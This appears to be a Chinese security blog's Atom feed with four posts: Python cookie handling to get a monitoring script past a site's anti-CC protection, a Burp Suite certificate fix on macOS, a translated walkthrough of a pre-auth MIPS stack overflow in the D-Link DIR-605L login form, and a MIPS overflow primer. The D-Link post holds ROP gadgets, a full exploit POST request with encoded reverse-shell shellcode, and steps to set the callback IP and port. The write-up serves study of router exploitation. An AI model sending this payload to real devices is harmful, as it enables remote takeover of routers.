<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xd_xd&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://xdxd.love/"/>
  <updated>2017-03-30T08:06:04.000Z</updated>
  <id>http://xdxd.love/</id>
  
  <author>
    <name>xd_xd</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python处理Set-Cookie</title>
    <link href="http://xdxd.love/2017/03/30/python%E5%A4%84%E7%90%86Set-Cookie/"/>
    <id>http://xdxd.love/2017/03/30/python处理Set-Cookie/</id>
    <published>2017-03-30T07:50:18.000Z</published>
    <updated>2017-03-30T08:06:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前写了一个小脚本，监控网站帖子变化。最近由于这个论坛被CC了，加了360网站宝的防护。导致脚本失效了。所以花了一点时间看了下360网站宝的防CC策略。</p>
<p>除了对访问频率的限制，还通过set-cookie设置了一些cookie。通过检查cookie的<br>有效性来决定是否可以访问。</p>
<p>当没有cookie的访问的时候，是来到一个设置cookie的中间页面。</p>
<p><img src="/images/session1.png" alt=""></p>
<p><img src="/images/session2.png" alt=""></p>
<p>拿到有效的cookie再次访问，才会真正的获得内容。而且cookie是存在有效时间的。获得一个cookie放到脚本里的思路也是不行的。</p>
<p>所以需要脚本模拟浏览器解析setcookie的设置，根据服务器返回的setcookie头设置cookie，再去请求内容。这个需求使用requests库的session对象，可以方便的实现。</p>
<p><a href="http://docs.python-requests.org/zh_CN/latest/user/advanced.html" target="_blank" rel="external">http://docs.python-requests.org/zh_CN/latest/user/advanced.html</a></p>
<pre><code>s = requests.Session()

s.<span class="literal">get</span>('http:<span class="comment">//httpbin.org/cookies/set/sessioncookie/123456789')</span>
r = s.<span class="literal">get</span>(<span class="string">"http://httpbin.org/cookies"</span>)

<span class="keyword">print</span>(r.text)
# '{<span class="string">"cookies"</span>: {<span class="string">"sessioncookie"</span>: <span class="string">"123456789"</span>}}'
</code></pre><p>360网站宝设置了BuJ8<em>2132</em>开头的多个cookie。</p>
<p><img src="/images/session3.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前写了一个小脚本，监控网站帖子变化。最近由于这个论坛被CC了，加了360网站宝的防护。导致脚本失效了。所以花了一点时间看了下360网站宝的防CC策略。&lt;/p&gt;
&lt;p&gt;除了对访问频率的限制，还通过set-cookie设置了一些cookie。通过检查cookie的&lt;br&gt;有效
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mac上安装burpsuite证书</title>
    <link href="http://xdxd.love/2017/03/15/mac%E4%B8%8A%E5%AE%89%E8%A3%85burpsuite%E8%AF%81%E4%B9%A6/"/>
    <id>http://xdxd.love/2017/03/15/mac上安装burpsuite证书/</id>
    <published>2017-03-15T07:01:29.000Z</published>
    <updated>2017-03-15T08:14:13.000Z</updated>
    
    <content type="html"><![CDATA[<p>环境：burpsuite 1.7.12  mac sierra</p>
<p>问题：burpsuite无法拦截https的请求，报错信息为：使用了不受支持的协议。ERR_SSL_VERSION_OR_CIPHER_MISMATCH.协议不受支持。</p>
<p><img src="/images/burpsuitecert1.png" alt=""></p>
<p>思路：考虑是证书的问题。查看project options的SSL配置。从default修改为Use custom pro<br>tocols and ciphers</p>
<p><img src="/images/burpsuitecert2.png" alt=""></p>
<p>发现浏览器报证书不正确，手动同意以后可以打开网站。但是外部的https无法自动加载。</p>
<p>最终解决方案。在mac上导入burpsuite的证书。</p>
<p>访问<a href="http://burp/cert" target="_blank" rel="external">http://burp/cert</a> 下载证书。然后打开mac的钥匙串访问。导入证书并且修改<br>PortSwigger CA为始终信任。<br><img src="/images/burpsuitecert3.png" alt=""></p>
<p>最终效果，浏览器显示为信任。</p>
<p><img src="/images/burpsuitecert4.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;环境：burpsuite 1.7.12  mac sierra&lt;/p&gt;
&lt;p&gt;问题：burpsuite无法拦截https的请求，报错信息为：使用了不受支持的协议。ERR_SSL_VERSION_OR_CIPHER_MISMATCH.协议不受支持。&lt;/p&gt;
&lt;p&gt;&lt;img s
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一个mips栈溢出利用</title>
    <link href="http://xdxd.love/2016/12/09/%E4%B8%80%E4%B8%AAmips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8/"/>
    <id>http://xdxd.love/2016/12/09/一个mips栈溢出利用/</id>
    <published>2016-12-09T01:58:59.000Z</published>
    <updated>2016-12-09T02:09:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>翻译自<a href="http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/" target="_blank" rel="external">http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/</a>.这是D-link路由器一个未登录前的栈溢出利用.本文并非为原文的对照翻译,而是侧重记录在实践测试过程的问题和分析，算是一个读书笔记。</p>
<a id="more"></a>
<h1 id="静态分析">静态分析</h1><p>DIR-605L路由器存在一个登陆处的栈溢出.登录时候的表单中存在一个FILECODE的参数,这个参数是用来识别登录窗口显示的验证码图片.服务端获取这个参数之后存在了$s1寄存器中.</p>
<pre><code><span class="keyword">la</span>      <span class="label">$t9</span>, websGetVar
<span class="keyword">move</span>    <span class="label">$s7</span>, <span class="label">$v0</span>
jalr    <span class="label">$t9</span> ; websGetVar
addiu   <span class="label">$a1</span>, (aFilecode - 0x4A0000)  # “FILECODE"
lw      <span class="label">$gp</span>, 0x290+var_280(<span class="label">$sp</span>)
<span class="keyword">move</span>    <span class="label">$s1</span>, <span class="label">$v0</span>
<span class="keyword">li</span>      <span class="label">$v0</span>, 1
</code></pre><p>这里一个点就是MIPS的分支延迟,位于跳转后面的一条指令会在跳转之前执行.所以实际上执行的是</p>
<pre><code>addiu   <span class="variable">$a1</span>, (aFilecode - <span class="number">0x4A0000</span>)  <span class="preprocessor"># <span class="string">"FILECODE"</span></span>
jalr    <span class="variable">$t9</span> <span class="comment">; websGetVar</span>
</code></pre><p>获得的FILECODE参数值存在$vo中,又存入$s1.</p>
<p>然后获取的值作为getAuthCode函数的第二个参数，传递给getAuthCode.mips中函数调用参数通过$a0-$a3传递。超过4个的参数使用栈传递。</p>
<pre><code>loc_455FF0:
la      <span class="variable">$t9</span>, getAuthCode   <span class="comment"># load address </span>
move    <span class="variable">$a1</span>, <span class="variable">$s1</span>   <span class="comment"># a1=s1 </span>
jalr    <span class="variable">$t9</span> ; getAuthCode  <span class="comment"># run getAuthCode</span>
move    <span class="variable">$a0</span>, <span class="variable">$s0</span> <span class="comment"># a0=s0</span>
</code></pre><p>getAuthCode函数中将FILECODE又存到$s1寄存器，然后作为第三个参数传递给sprintf。</p>
<pre><code><span class="keyword">li</span>      <span class="label">$gp</span>, 0x98AFC
addu    <span class="label">$gp</span>, <span class="label">$t9</span>
addiu   <span class="label">$sp</span>, -0xC0
<span class="keyword">sw</span>      <span class="label">$ra</span>, 0xC0+var_8(<span class="label">$sp</span>)
<span class="keyword">sw</span>      <span class="label">$s3</span>, 0xC0+var_C(<span class="label">$sp</span>)
<span class="keyword">sw</span>      <span class="label">$s2</span>, 0xC0+var_10(<span class="label">$sp</span>)
<span class="keyword">sw</span>      <span class="label">$s1</span>, 0xC0+var_14(<span class="label">$sp</span>)
<span class="keyword">sw</span>      <span class="label">$s0</span>, 0xC0+var_18(<span class="label">$sp</span>)
<span class="keyword">sw</span>      <span class="label">$gp</span>, 0xC0+var_B0(<span class="label">$sp</span>)
<span class="keyword">la</span>      <span class="label">$t9</span>, memset
addiu   <span class="label">$s2</span>, <span class="label">$sp</span>, 0xC0+var_A8
<span class="keyword">move</span>    <span class="label">$s1</span>, <span class="label">$a1</span>   # s1=a1

<span class="keyword">move</span>    <span class="label">$a0</span>, <span class="label">$s0</span>  # a0=s0
<span class="keyword">move</span>    <span class="label">$a2</span>, <span class="label">$s1</span> #a2=s1
<span class="keyword">la</span>      <span class="label">$a1</span>, aIg_smtp_email_  # <span class="string">"ig.smtp_email_addr"</span>
<span class="keyword">la</span>      <span class="label">$t9</span>, sprintf
nop
jalr    <span class="label">$t9</span> ; sprintf
addiu   <span class="label">$a1</span>, (aVarAuthS_msg - 0x4A0000)  # <span class="string">"/var/auth/%s.msg"</span>
</code></pre><p>sprintf 函数一共接收了3个参数。</p>
<p>sprintf()函数用于将格式化的数据写入字符串，其原型为：</p>
<pre><code><span class="function"><span class="keyword">int</span> <span class="title">sprintf</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">char</span> * format [, argument, ...])</span></span>;
</code></pre><p>用于将格式化的字符串写入第一个参数中。这里a0=s0.而s0在栈上的地位为：</p>
<pre><code>jalr    <span class="variable">$t9</span> ; memset
addiu   <span class="variable">$s0</span>, <span class="variable">$sp</span>, <span class="number">0xC0</span>+var_8<span class="number">0</span>
lw      <span class="variable">$gp</span>, <span class="number">0xC0</span>+var_B<span class="number">0</span>(<span class="variable">$sp</span>)
move    <span class="variable">$a0</span>, <span class="variable">$s0</span>
move    <span class="variable">$a1</span>, <span class="variable">$zero</span>
la      <span class="variable">$t9</span>, memset
</code></pre><p>这是一个典型的栈缓冲区溢出，通过这个溢出可以覆盖存在栈上的寄存器内容和程序返回地址。偏移也比较容易计算。可以通过以下post请求进行验证。</p>
<pre><code><span class="request">POST <span class="string">/goform/formLogin</span> HTTP/1.1</span>
<span class="attribute">Host</span>: <span class="string">localhost</span>
<span class="attribute">User-Agent</span>: <span class="string">Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span>
<span class="attribute">Accept</span>: <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="attribute">Accept-Language</span>: <span class="string">en-US,en;q=0.5</span>
<span class="attribute">Accept-Encoding</span>: <span class="string">gzip, deflate</span>
<span class="attribute">Connection</span>: <span class="string">keep-alive</span>
<span class="attribute">Content-Type</span>: <span class="string">application/x-www-form-urlencoded</span>
<span class="attribute">Content-Length</span>: <span class="string">257</span>

<span class="cpp">VERIFICATION_CODE=myvoiceismypassportverifyme&amp;FILECODE=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDD&amp;login_name=&amp;curTime=<span class="number">1348588030496</span>&amp;login_n=admin&amp;login_pass=Zm9vb255b3UA&amp;VER_CODE=</span>
</code></pre><p>先用qemu启动boa程序。</p>
<p><img src="/images/mipsstackexp1.png" alt=""></p>
<p>程序触发段错误低位为44444444.<br><img src="/images/mipsstackexp2.png" alt=""></p>
<p>返回地址和寄存器 s0-s3都可被覆盖。<br><img src="/images/mipsstackexp3.png" alt=""></p>
<p>编写exploit之前需要注意几点。一是payload不能有NULL，而且不能有字符’g’.因为在payload进入getAuthCode之前有一个字符处理逻辑。</p>
<p><img src="/images/mipsstackexp4.png" alt=""></p>
<p>如果存在字符g，则在g后一个字节置0。sb $zero ,!($v0)</p>
<p>mips的exp编写中还有一个问题就是cache incoherency。MIPS CPUs有两个独立的cache：指令cache和数据cache。指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush，将数据写回到主内存。攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中。当payload触发漏洞，劫持程序执行流程的时候，会去执行内存中的shellcode。如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。</p>
<p>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如sleep(1)或者其他类似的函数。sleep的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行flush。</p>
<p>比较好的方式利用ROP执行sleep(1)函数。使用ida mips rop插件在libc中搜索 li $a0,1</p>
<pre><code>Python&gt;mipsrop.find(<span class="string">"li $a0,1"</span>)
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  <span class="number">0x000248D4</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jalr  <span class="variable">$s1</span>                             |
|  <span class="number">0x00011044</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jalr  <span class="variable">$v0</span>                             |
|  <span class="number">0x0002B068</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x28</span>+var_4(<span class="variable">$sp</span>)                 |
|  <span class="number">0x0002B45C</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x28</span>+var_4(<span class="variable">$sp</span>)                 |
|  <span class="number">0x0002B5C8</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x28</span>+var_4(<span class="variable">$sp</span>)                 |
|  <span class="number">0x0002B864</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x30</span>+var_4(<span class="variable">$sp</span>)                 |
|  <span class="number">0x0002BD00</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x28</span>+var_8(<span class="variable">$sp</span>)                 |
----------------------------------------------------------------------------------------------------------------
Found <span class="number">7</span> matching gadgets
</code></pre><p>0x248D4处代码。</p>
<pre><code>li      <span class="variable">$a0</span>, <span class="number">1</span>
move    <span class="variable">$t9</span>, <span class="variable">$s1</span>
jalr    <span class="variable">$t9</span> ; sub_244E<span class="number">0</span>
ori     <span class="variable">$a1</span>, <span class="variable">$s0</span>, <span class="number">2</span>
ori     <span class="variable">$a1</span>, <span class="variable">$s0</span>, <span class="number">2</span>
move    <span class="variable">$t9</span>, <span class="variable">$s1</span>
jalr    <span class="variable">$t9</span> ; sub_244E<span class="number">0</span>
li      <span class="variable">$a0</span>, <span class="number">2</span>
</code></pre><p>将$a0设置为1，复制$s1的值到$t9,然后执行$t9的函数，而$s1使我们通过溢出可以控制的。非常适合做为rop的gadget。</p>
<p>整个ROP的流程最基本的思路是，覆盖返回地址，返回地址指向栈上我们部署的shellcode地址。但是由于缓存的问题，需要先指向执行sleep，在指向shellcode的地址。</p>
<p>devttys0中第一个gadget只是设置了a0的值，即设置了sleep函数的参数。下一个gadget是libc.so中的0x2B954.</p>
<pre><code>LOAD<span class="value">:<span class="number">0002</span>B954                 move    <span class="variable">$t9</span>, <span class="variable">$s2</span>
LOAD:<span class="number">0002</span>B958
LOAD:<span class="number">0002</span>B958 loc_2B958:                               # CODE XREF: xdr_union+<span class="number">84</span>j
LOAD:<span class="number">0002</span>B958                 lw      <span class="variable">$ra</span>, <span class="number">0</span>x30+<span class="function">var_4</span>(<span class="variable">$sp</span>)
LOAD:<span class="number">0002</span>B95C                 lw      <span class="variable">$s4</span>, <span class="number">0</span>x30+<span class="function">var_8</span>(<span class="variable">$sp</span>)
LOAD:<span class="number">0002</span>B960                 lw      <span class="variable">$s3</span>, <span class="number">0</span>x30+<span class="function">var_C</span>(<span class="variable">$sp</span>)
LOAD:<span class="number">0002</span>B964                 lw      <span class="variable">$s2</span>, <span class="number">0</span>x30+<span class="function">var_10</span>(<span class="variable">$sp</span>)
LOAD:<span class="number">0002</span>B968                 lw      <span class="variable">$s1</span>, <span class="number">0</span>x30+<span class="function">var_14</span>(<span class="variable">$sp</span>)
LOAD:<span class="number">0002</span>B96C                 lw      <span class="variable">$s0</span>, <span class="number">0</span>x30+<span class="function">var_18</span>(<span class="variable">$sp</span>)
LOAD:<span class="number">0002</span>B970                 jr      <span class="variable">$t9</span>
LOAD:<span class="number">0002</span>B974                 addiu   <span class="variable">$sp</span>, <span class="number">0</span>x30</span>
</code></pre><p>复制s2的值到t9，然后跳到t9执行。中间重新设置了ra和s1等寄存器的值。这里s2可以指向sleep函数，执行完sleep，就会跳到可控的ra执行。</p>
<pre><code>LOAD:<span class="number">000027</span>E8                 move    <span class="variable">$t9</span>, <span class="variable">$s1</span>
LOAD:<span class="number">000027</span>EC                 jalr    <span class="variable">$t9</span> ; sub_22D<span class="number">0</span>
LOAD:<span class="number">000027</span>F<span class="number">0</span>                 addiu   <span class="variable">$a2</span>, <span class="variable">$sp</span>, <span class="number">0x40</span>+var_24
</code></pre><p>下一步是寻找一个栈上的偏移地址。apmib.so中偏移0x27E8的位置，将$sp+0x1c存入$a2,然后跳到$s1,如果把$s1指向apmib.so的0x1D78,这里把$a2复制到$t9，跳转到t9。这样，就可以跳转到一个相对于$sp偏移的地址。只需要把shellcode部署在$sp+0x1C就可以了。</p>
<pre><code>LOAD:<span class="number">00001</span>D78                 move    <span class="variable">$t9</span>, <span class="variable">$a2</span>
LOAD:<span class="number">00001</span>D7C                 jalr    <span class="variable">$t9</span> ; printf
LOAD:<span class="number">00001</span>D8<span class="number">0</span>                 nop
</code></pre><p>最后的请求为：</p>
<pre><code><span class="request">POST <span class="string">/goform/formLogin</span> HTTP/1.1</span>
<span class="attribute">Content-Type</span>: <span class="string">application/x-www-form-urlencoded</span>
<span class="attribute">Content-Length</span>: <span class="string">894</span>

<span class="mel">
VERIFICATION_CODE=myvoiceismypassportverifyme&amp;FILECODE=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class="variable">%2A</span><span class="variable">%BB</span><span class="variable">%19T</span><span class="variable">%2A</span><span class="variable">%BA</span><span class="variable">%9D0AAAA</span><span class="variable">%2A</span><span class="variable">%BA</span><span class="variable">%A8</span><span class="variable">%D4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="variable">%2A</span><span class="variable">%AF</span><span class="variable">%0DxAAAAAAAAAAAA</span><span class="variable">%2A</span><span class="variable">%AF</span><span class="variable">%17</span><span class="variable">%E8AAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="variable">%24</span><span class="variable">%0F</span><span class="variable">%FF</span><span class="variable">%FA</span><span class="variable">%01</span><span class="variable">%E0x</span><span class="variable">%27</span><span class="variable">%21</span><span class="variable">%E4</span><span class="variable">%FF</span><span class="variable">%FD</span><span class="variable">%21</span><span class="variable">%E5</span><span class="variable">%FF</span><span class="variable">%FD</span><span class="variable">%28</span><span class="variable">%06</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%24</span><span class="variable">%02</span><span class="variable">%10W</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%0C</span><span class="variable">%AF</span><span class="variable">%A2</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%8F</span><span class="variable">%A4</span><span class="variable">%FF</span><span class="variable">%FF4</span><span class="variable">%0F</span><span class="variable">%FF</span><span class="variable">%FD</span><span class="variable">%01</span><span class="variable">%E0x</span><span class="variable">%27</span><span class="variable">%AF</span><span class="variable">%AF</span><span class="variable">%FF</span><span class="variable">%E0</span><span class="variable">%3C</span><span class="variable">%0E</span><span class="variable">%1F</span><span class="variable">%905</span><span class="variable">%CE</span><span class="variable">%1F</span><span class="variable">%90</span><span class="variable">%AF</span><span class="variable">%AE</span><span class="variable">%FF</span><span class="variable">%E4</span><span class="variable">%3C</span><span class="variable">%0E</span><span class="variable">%7F</span><span class="variable">%015</span><span class="variable">%CE</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%AF</span><span class="variable">%AE</span><span class="variable">%FF</span><span class="variable">%E6</span><span class="variable">%27</span><span class="variable">%A5</span><span class="variable">%FF</span><span class="variable">%E2</span><span class="variable">%24</span><span class="variable">%0C</span><span class="variable">%FF</span><span class="variable">%EF</span><span class="variable">%01</span><span class="variable">%800</span><span class="variable">%27</span><span class="variable">%24</span><span class="variable">%02</span><span class="variable">%10J</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%0C</span><span class="variable">%24</span><span class="variable">%0F</span><span class="variable">%FF</span><span class="variable">%FD</span><span class="variable">%01</span><span class="variable">%E0x</span><span class="variable">%27</span><span class="variable">%8F</span><span class="variable">%A4</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%01</span><span class="variable">%E0</span><span class="variable">%28</span><span class="variable">%21</span><span class="variable">%24</span><span class="variable">%02</span><span class="variable">%0F</span><span class="variable">%DF</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%0C</span><span class="variable">%24</span><span class="variable">%10</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%21</span><span class="variable">%EF</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%15</span><span class="variable">%F0</span><span class="variable">%FF</span><span class="variable">%FA</span><span class="variable">%28</span><span class="variable">%06</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%3C</span><span class="variable">%0F</span><span class="variable">%2F</span><span class="variable">%2F5</span><span class="variable">%EFbi</span><span class="variable">%AF</span><span class="variable">%AF</span><span class="variable">%FF</span><span class="variable">%EC</span><span class="variable">%3C</span><span class="variable">%0En</span><span class="variable">%2F5</span><span class="variable">%CEsh</span><span class="variable">%AF</span><span class="variable">%AE</span><span class="variable">%FF</span><span class="variable">%F0</span><span class="variable">%AF</span><span class="variable">%A0</span><span class="variable">%FF</span><span class="variable">%F4</span><span class="variable">%27</span><span class="variable">%A4</span><span class="variable">%FF</span><span class="variable">%EC</span><span class="variable">%AF</span><span class="variable">%A4</span><span class="variable">%FF</span><span class="variable">%F8</span><span class="variable">%AF</span><span class="variable">%A0</span><span class="variable">%FF</span><span class="variable">%FC</span><span class="variable">%27</span><span class="variable">%A5</span><span class="variable">%FF</span><span class="variable">%F8</span><span class="variable">%24</span><span class="variable">%02</span><span class="variable">%0F</span><span class="variable">%AB</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%0C</span>&amp;curTime=<span class="number">1348588030496</span>&amp;VER_CODE=<span class="number">1234</span>&amp;login_n=admin&amp;login_pass=Zm9vb255b3UA&amp;login_name=admin</span>
</code></pre><p>使用文中提供的exp测试结果：</p>
<p><a href="http://www.devttys0.com/wp-content/uploads/2012/10/dir605l_exploit.txt" target="_blank" rel="external">http://www.devttys0.com/wp-content/uploads/2012/10/dir605l_exploit.txt</a></p>
<p><img src="/images/mipsstackexp5.png" alt=""></p>
<p>poc中，反弹端口和ip写死了。测试起来不是很方便。可以手动修改如下位置：</p>
<pre><code><span class="preprocessor"># port number</span>
<span class="preprocessor"># <span class="number">0x1f90</span> = <span class="number">8080</span></span>
<span class="preprocessor"># <span class="number">0x1ff5</span> =<span class="number">8181</span></span>
<span class="string">"\x3c\x0e\x1f\xf5"</span>, <span class="preprocessor"># lui     t6,<span class="number">0x1f90</span></span>
<span class="string">"\x35\xce\x1f\xf5"</span>, <span class="preprocessor"># ori     t6,t6,<span class="number">0x1f90</span></span>
<span class="string">"\xaf\xae\xff\xe4"</span>, <span class="preprocessor"># sw     t6,-<span class="number">28</span>(sp)</span>

<span class="preprocessor"># Big endian IP address <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span></span>
<span class="preprocessor">#<span class="number">0xc0</span> = <span class="number">192</span></span>
<span class="preprocessor">#<span class="number">0xA8</span> = <span class="number">168</span></span>
<span class="preprocessor">#<span class="number">0x01</span> = <span class="number">1</span></span>
<span class="preprocessor">#<span class="number">0x64</span> = <span class="number">100</span></span>
<span class="preprocessor">#<span class="number">0x65</span> = <span class="number">101</span></span>
<span class="string">"\x3c\x0e\xc0\xA8"</span>, <span class="preprocessor"># lui     t6,<span class="number">0x7f01</span></span>
<span class="string">"\x35\xce\x01\x65"</span>, <span class="preprocessor"># ori     t6,t6,<span class="number">0x101</span></span>
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;翻译自&lt;a href=&quot;http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/&quot;&gt;http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/&lt;/a&gt;.这是D-link路由器一个未登录前的栈溢出利用.本文并非为原文的对照翻译,而是侧重记录在实践测试过程的问题和分析，算是一个读书笔记。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一个简单的mips架构缓冲区溢出分析</title>
    <link href="http://xdxd.love/2016/11/19/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/11/19/一个简单的mips架构缓冲区溢出分析/</id>
    <published>2016-11-19T07:00:17.000Z</published>
    <updated>2016-11-21T02:53:43.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="缓冲区溢出原理">缓冲区溢出原理</h1><p>简单的说，缓冲区溢出就是在大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检查不严格，导致小缓冲区不足以接受整个大缓冲区的数据，超出的部分覆盖了与小缓冲区的相邻的内存区中的其他数据而引发的内存问题。(注1)<br><a id="more"></a></p>
<h1 id="简单示例">简单示例</h1><pre><code><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">"string.h"</span></span>
<span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>{
    <span class="keyword">char</span> password[<span class="number">100</span>];
    <span class="built_in">printf</span>(<span class="string">"\nPlease input your Password: "</span>);
    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, password);
    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, <span class="string">"stackoverflow"</span>)) {
        <span class="built_in">printf</span>(<span class="string">"Welcome to the new world\n"</span>);
    }<span class="keyword">else</span> {
        <span class="built_in">printf</span>(<span class="string">"Login failed\nGoodbye!\n"</span>);
    }
    <span class="keyword">return</span> <span class="number">0</span>;
}
</code></pre><p>编译代码生成可执行文件。</p>
<pre><code><span class="regexp">/root/</span>buildroot-<span class="number">2016.05</span><span class="regexp">/output/</span>host<span class="regexp">/usr/</span>bin/mipsel-linux-gcc secret.c -o secret -<span class="keyword">static</span>
</code></pre><p>可以看到这个程序的逻辑比较简单，她要求用户输入一个密码。然后检查密码是否正确，如果正确，就打印欢迎信息，如果错误就返回登录失败的信息。</p>
<p><img src="/images/simplemips1.png" alt=""></p>
<p>对于一个正常的应用来说，100个字符的用户名应该足够了。但是如果有人输入了超过100个字符的用户名会有什么情况发生呢。scanf并不会去检查边界，而是盲目的接受所有的字符。</p>
<p>我们来测试一下输入超过100个字符的密码。</p>
<p>可以看到程序正常的运行结束之后抛出了一个提示：</p>
<pre><code>qemu: uncaught <span class="keyword">target</span> signal 11 (Segmentation fault) - core dumped
Segmentation fault
</code></pre><p><img src="/images/simplemips2.png" alt=""></p>
<p>使用qemu结合ida进行动态分析：</p>
<p>运行程序程序，输入超长的用户名，发现程序运行0x61616161处的指令时发生了崩溃，引发了段故障错误。崩溃现场如图：</p>
<p><img src="/images/simplemips3.png" alt=""></p>
<p>可以看到stack view中栈空间充满了61616161，而且寄存器$RA,$FP的值都是61616161，61是我们输入的用户名字母a的16进制编码。所以，超长的字符串劫持了程序的执行流程，让程序执行到了0x61616161这个我们可控的地址继续执行，而这个地址使我们随意输入的，从而导致了程序崩溃。</p>
<h1 id="栈空间布局分析">栈空间布局分析</h1><p>因为我们有程序的源码，而且程序比较简单。所以直接阅读汇编代码也比较清晰，只有一个判断分支。</p>
<p><img src="/images/simplemips4.png" alt=""></p>
<h1 id="参考资料">参考资料</h1><p>栈操作：MIPS32架构与X86架构一样，都是向低地址增长的。但在MIPS32架构中没有EBP(栈底指针)，进入一个函数时，需要将当前栈指针向下移动n比特，这个大小为n比特的存储空间就是此函数的stack frame的存储区域。此后，栈指针便不在移动，只能在函数返回时将栈指针加上这个偏移量回复栈现场。由于不能随便移动栈指针，所以寄存器压栈和出栈时都必须指定偏移量。</p>
<p>返回地址：在x86架构中，使用call命令调用函数时，会先将当前执行位置压入堆栈，MIPS的调用指令把函数的返回地址直接存入$RA寄存器而不是堆栈中。（注1）</p>
<pre><code>addiu   <span class="label">$sp</span>, -0x88
<span class="keyword">sw</span>      <span class="label">$ra</span>, 0x88+var_4(<span class="label">$sp</span>)
<span class="keyword">sw</span>      <span class="label">$fp</span>, 0x88+var_8(<span class="label">$sp</span>)
<span class="keyword">move</span>    <span class="label">$fp</span>, <span class="label">$sp</span>
<span class="keyword">li</span>      <span class="label">$gp</span>, 0x4A6670
<span class="keyword">sw</span>      <span class="label">$gp</span>, 0x88+var_78(<span class="label">$sp</span>)
lui     <span class="label">$v0</span>, 0x47  # '<span class="keyword">G</span>'
addiu   <span class="label">$a0</span>, <span class="label">$v0</span>, (aPleaseInputYou - 0x470000)  # <span class="string">"\nPlease input your Password: "</span>
<span class="keyword">la</span>      <span class="label">$v0</span>, printf
<span class="keyword">move</span>    <span class="label">$t9</span>, <span class="label">$v0</span>
jalr    <span class="label">$t9</span> ; printf
nop
lw      <span class="label">$gp</span>, 0x88+var_78(<span class="label">$fp</span>)
lui     <span class="label">$v0</span>, 0x47  # '<span class="keyword">G</span>'
addiu   <span class="label">$a0</span>, <span class="label">$v0</span>, (aS_2 - 0x470000)  # <span class="string">"%s"</span>
addiu   <span class="label">$v0</span>, <span class="label">$fp</span>, 0x88+var_70
<span class="keyword">move</span>    <span class="label">$a1</span>, <span class="label">$v0</span>
<span class="keyword">la</span>      <span class="label">$v0</span>, __isoc99_scanf
<span class="keyword">move</span>    <span class="label">$t9</span>, <span class="label">$v0</span>
jalr    <span class="label">$t9</span> ; __isoc99_scanf
nop
